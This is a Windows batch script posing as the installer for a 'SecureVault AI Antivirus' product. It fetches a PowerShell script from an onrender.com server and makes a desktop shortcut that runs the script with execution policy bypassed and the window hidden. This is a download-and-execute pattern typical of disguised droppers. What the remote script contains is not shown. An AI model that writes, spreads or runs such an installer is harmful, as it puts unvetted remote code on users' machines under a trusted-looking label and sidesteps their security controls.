@echo off
title SecureVault AI Antivirus Installer
color 0A
echo ========================================================
echo        SECUREVAULT TOTAL AI ANTIVIRUS INSTALLER
echo ========================================================
echo.
echo Installing SecureVault Neural Engines...
set "INSTALL_DIR=%APPDATA%\SecureVault"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [1/3] Fetching AI Agent core from SecureVault Servers...
powershell -Command "Invoke-WebRequest -Uri 'https://securevault-main.onrender.com/api/system-shield/gui-script' -OutFile '%INSTALL_DIR%\sentinel_gui.ps1'"

echo [2/3] Configuring local environment and Desktop Shortcut...
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%USERPROFILE%\Desktop\SecureVault AI Antivirus.lnk'); $Shortcut.TargetPath = 'powershell.exe'; $Shortcut.Arguments = '-ExecutionPolicy Bypass -WindowStyle Hidden -File \"'+$env:APPDATA+'\SecureVault\sentinel_gui.ps1\"'; $Shortcut.IconLocation = 'shell32.dll,22'; $Shortcut.Save()"

echo [3/3] Finalizing Installation...
timeout /t 2 >nul

echo.
echo ========================================================
echo INSTALLATION COMPLETE!
echo A shortcut 'SecureVault AI Antivirus' is on your Desktop.
echo Double-click it to launch the AI Security Console.
echo ========================================================
pause
